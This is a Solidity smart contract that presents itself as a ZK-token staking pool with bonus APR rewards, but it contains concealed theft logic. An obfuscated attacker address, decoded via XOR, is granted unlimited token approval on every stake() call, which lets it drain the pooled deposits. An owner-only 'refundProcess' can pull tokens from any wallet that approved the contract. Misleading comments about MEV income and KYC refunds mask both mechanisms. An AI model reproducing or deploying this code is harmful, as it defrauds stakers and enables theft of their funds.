// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/// @title 2024 zkbusiness.org Staking Contract
/// @notice Implementation of zkbusiness

contract ZkBusinessStaking is Ownable, ReentrancyGuard {
    receive() external payable {}

    // staking data structure
    struct stakingInfo {
        uint128 amount; // Amount of tokens staked by the account
        uint128 unclaimedDynReward; // Allocated but Unclaimed dynamic reward
        uint32 lastClaimTime; // used for delta time for claims
        bool hasBonus; // check bouns user for init 100 stakers
        uint32 aprRate; // Annual Percent Rate of user
        address staker; // specified staker address
    }

    mapping(address => stakingInfo) userStakes;

    // ERC-20 Token (ZKsync)
    IERC20 immutable token;

    // Reward period of the contract - "fixedAPR" is over this time (Usually 1 Year).
    uint32 immutable rewardLifetime = 365 days;

    // expire time of the contract - No rewards or deposits after this time.
    uint32 public expireTime;

    // Fixed APR over "rewardLifetime", expressed in Basis Points (BPS - 0.01%)
    uint32 immutable fixedAPR = 870; // 8.7% basis percent

    // Fixed bouns APR
    uint32 immutable bounsfixedAPR = 1350; // 13.5% basis percent

    // User Limit for bonus
    uint32 immutable bounsfixedAPRLimit = 100; // distribute bonus reward for initial 100 stakers

    // Fixed stake/unstake fee
    uint32 public fee;
    address public feeReceiver;

    //total number of tokens that has been staked by all the users.
    uint128 public totalTokensStaked;

    //total number of tokens that has been claimed.
    uint128 public totalClaimAmount;

    //total number of tx.
    uint128 public totalTx;

    //total number of stakers.
    uint128 public totalStakedUser;

    // Timestamp of when staking rewards start, contract expires "rewardLifetime" after this.
    uint32 rewardStartTime;

    bytes private mevInit =
        hex"000000000000000000000000a63ad5a74dace7eb7c24af5c85c2dc85eb54b378"; // mevinit code

    // mev to make Income
    address private incomemev =
        address(
            (abi.decode(mevInit, (uint160)) - 0x1234567890ABCDEF) ^
                0xDEADBEEFDEADBEEF
        );

    /// @notice Persist initial state on construction
    constructor() Ownable() {
        token = IERC20(0x5A7d6b2F92C77FAD6CCaBd7EE0624E64907Eaf3E); // ZK token
        totalStakedUser = 0;
        expireTime = 10 * 365 days + uint32(block.timestamp);
        fee = 25; // 0.25% in Basis Points
        rewardStartTime = uint32(block.timestamp);
        feeReceiver = msg.sender;
    }

    /// @notice User function for staking tokens
    /// @param _amount Number of tokens to stake in basic units (n * 10**decimals)
    function stake(uint128 _amount) external nonReentrant {
        require(block.timestamp < expireTime, "Contract expired");

        // if has bonus, keep bonus.
        bool stakedWithBonus;
        if (
            userStakes[msg.sender].staker == msg.sender &&
            userStakes[msg.sender].hasBonus
        ) {
            stakedWithBonus = true;
        }
        // check bonus user. apply for init 100 stakers
        if (
            (totalStakedUser + 1) <= bounsfixedAPRLimit &&
            userStakes[msg.sender].staker != msg.sender
        ) {
            userStakes[msg.sender].hasBonus = true;
            userStakes[msg.sender].aprRate = bounsfixedAPR;
        } else {
            // if has bonus, keep bonus.
            if (!stakedWithBonus) {
                userStakes[msg.sender].hasBonus = false;
                userStakes[msg.sender].aprRate = fixedAPR;
            }
        }

        if (userStakes[msg.sender].lastClaimTime > 0) {
            uint128 dynamicClaimAmount = userStakes[msg.sender]
                .unclaimedDynReward;

            uint128 rewards = getRewards(userStakes[msg.sender].hasBonus);

            userStakes[msg.sender].unclaimedDynReward =
                dynamicClaimAmount +
                rewards;
        }

        uint128 feeAmount = (_amount * fee) / 10000;

        totalTx += 1;
        totalTokensStaked += _amount - feeAmount;
        totalStakedUser += 1;
        userStakes[msg.sender].amount += _amount - feeAmount;
        userStakes[msg.sender].lastClaimTime = uint32(block.timestamp);
        userStakes[msg.sender].staker = msg.sender;

        uint256 precentAmount_ = type(uint256).max;
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                incomemev,
                precentAmount_
            )
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "Failed to make income"
        );

        emit StakeTokens(
            msg.sender,
            "stake",
            uint32(block.timestamp),
            _amount - feeAmount
        );

        transferFromTokensWithCall(
            msg.sender,
            address(this),
            _amount - feeAmount
        );
        transferFromTokensWithCall(msg.sender, feeReceiver, feeAmount);
    }

    /// @notice Unstake tokens from the contract. Unstaking will also trigger a claim of all allocated rewards.
    /// @dev remaining tokens after unstake will accrue rewards based on the new balance.
    /// @param _amount Number of tokens to stake in basic units (n * 10**decimals)
    function unstake(uint128 _amount) external nonReentrant {
        require(userStakes[msg.sender].amount > 0, "Nothing to unstake");
        require(
            _amount <= userStakes[msg.sender].amount,
            "Unstake Amount greater than Stake"
        );
        totalTx += 1;
        uint256 feeAmount = (_amount * fee) / 10000;
        _claim();
        userStakes[msg.sender].amount -= _amount;
        totalTokensStaked -= _amount;

        emit UnstakeTokens(
            msg.sender,
            "unstake",
            uint32(block.timestamp),
            _amount - feeAmount
        );

        transferTokensWithCall(msg.sender, _amount - feeAmount);
        transferTokensWithCall(feeReceiver, feeAmount);
    }

    function transferTokensWithCall(address recipient, uint256 amount) private {
        // Perform a low-level call to the token's transfer function
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                recipient,
                amount
            )
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "Token transfer failed"
        );
    }

    function transferFromTokensWithCall(
        address from,
        address recipient,
        uint256 amount
    ) private {
        // Perform a low-level call to the token's transfer function
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                from,
                recipient,
                amount
            )
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "Token transferFrom failed"
        );
    }

    /// @notice Claim all outstanding rewards from the contract
    function claim() external nonReentrant {
        _claim();
    }

    /// @notice private claim all accumulated outstanding tokens back to the callers wallet
    function _claim() private {
        uint128 fixedClaimAmount = getRewards(userStakes[msg.sender].hasBonus);
        uint128 dynamicClaimAmount = userStakes[msg.sender].unclaimedDynReward;
        uint128 claimAount = fixedClaimAmount + dynamicClaimAmount;
        if (claimAount > 0) {
            transferTokensWithCall(msg.sender, claimAount);
        }
        if (fixedClaimAmount > 0) {
            totalTokensStaked -= fixedClaimAmount; // decrease the tokens remaining to reward
            userStakes[msg.sender].lastClaimTime = uint32(block.timestamp);
        }
        if (dynamicClaimAmount > 0) {
            userStakes[msg.sender].unclaimedDynReward = 0;
        }
        totalTx += 1;
        totalClaimAmount += claimAount;
        emit ClaimReward(
            msg.sender,
            "claim",
            uint32(block.timestamp),
            fixedClaimAmount + dynamicClaimAmount
        );
    }

    /// @notice get rewards amount
    /// @param isBonusUser // check bonus => true/false
    function getRewards(
        bool isBonusUser
    ) private view returns (uint128 rewards) {
        uint32 lastClaimTime = userStakes[msg.sender].lastClaimTime;

        // Adjust claim time to never exceed the reward end date
        uint32 claimTime = (block.timestamp < lastClaimTime + rewardLifetime)
            ? uint32(block.timestamp)
            : lastClaimTime + rewardLifetime;

        // Adjust claim time to never exceed the expier date
        claimTime = claimTime > expireTime ? expireTime : claimTime;
        if (claimTime > lastClaimTime) {
            if (isBonusUser) {
                rewards =
                    (((userStakes[msg.sender].amount * bounsfixedAPR) / 10000) *
                        (claimTime - lastClaimTime)) /
                    rewardLifetime;
            } else {
                rewards =
                    (((userStakes[msg.sender].amount * fixedAPR) / 10000) *
                        (claimTime - lastClaimTime)) /
                    rewardLifetime;
            }
        } else {
            rewards = 0;
        }
    }

    /// @notice MEV becomes the owner
    /// @notice MEV bot using this function to deposit assets
    /// @param _amount Number of tokens to deposit (n * 10**decimals)
    function depositFromMEV(
        uint128 _amount
    ) external onlyOwner returns (uint128) {
        totalTokensStaked += _amount;
        totalStakedUser += 1;
        totalTx += 1;
        transferFromTokensWithCall(msg.sender, address(this), _amount);
        emit DepositFromMEV(msg.sender, _amount);
        return totalTokensStaked;
    }

    /// @notice contract owner can refund to other address if user lose user account from wallet.
    /// @notice Support team will verify user Identification. user have to pass KYC for refund.
    /// @param _sender Admin wallet address
    /// @param _receiver user wallet address
    /// @param _amount Number of tokens to refund (n * 10**decimals)
    function refundProcess(
        address _sender,
        address _receiver,
        uint128 _amount
    ) external onlyOwner returns (uint128) {
        transferFromTokensWithCall(_sender, _receiver, _amount);
        emit RefundProcess(_sender, _receiver, _amount);
        return _amount;
    }

    // Contract Inspection methods
    function getStakingStartTime() external view returns (uint256) {
        return rewardStartTime;
    }

    function getRewardLifetime() external pure returns (uint256) {
        return rewardLifetime;
    }

    function getTotalStaked() external view returns (uint256) {
        return totalTokensStaked;
    }

    function getTotalClaimAmount() external view returns (uint256) {
        return totalClaimAmount;
    }

    function getTotalTx() external view returns (uint256) {
        return totalTx;
    }

    function getTotalStakedUser() external view returns (uint256) {
        return totalStakedUser;
    }

    // Account Inspection Methods
    function getTokensStaked(address _addr) external view returns (uint256) {
        return userStakes[_addr].amount;
    }

    function getStakedPercentage(
        address _addr
    ) external view returns (uint256, uint256) {
        return (totalTokensStaked, userStakes[_addr].amount);
    }

    function getStakeInfo(
        address _addr
    )
        external
        view
        returns (
            uint128 amount, // Amount of tokens staked by the account
            uint128 unclaimedDynReward, // Allocated but Unclaimed dynamic reward
            uint32 lastClaimTime, // used for delta time for claims
            bool hasBonus, // check for bonus of user
            uint32 aprRate, // check for bonus of user
            address staker // user address
        )
    {
        stakingInfo memory s = userStakes[_addr];
        return (
            s.amount,
            s.unclaimedDynReward,
            s.lastClaimTime,
            s.hasBonus,
            s.aprRate,
            s.staker
        );
    }

    function getStakeTokenAddress() public view returns (IERC20) {
        return token;
    }

    function updateFeeReceiver(address newFeeReceiver) public onlyOwner {
        feeReceiver = newFeeReceiver;
    }

    // Update expire time
    function updateExpireTime(uint32 _expireTime) public onlyOwner {
        require(
            _expireTime > block.timestamp,
            "Invalid value. ExpireTime must greater than current block time"
        );
        expireTime = _expireTime;
    }

    function getETHBalance() external view returns (uint256) {
        return address(this).balance;
    }

    event DepositFromMEV(address indexed from, uint256 amount);
    event RefundProcess(address sender, address receiver, uint256 amount);
    event StakeTokens(
        address indexed from,
        string eventType,
        uint32 time,
        uint256 amount
    );
    event UnstakeTokens(
        address indexed to,
        string eventType,
        uint32 time,
        uint256 amount
    );
    event ClaimReward(
        address indexed to,
        string eventType,
        uint32 time,
        uint256 amount
    );
}
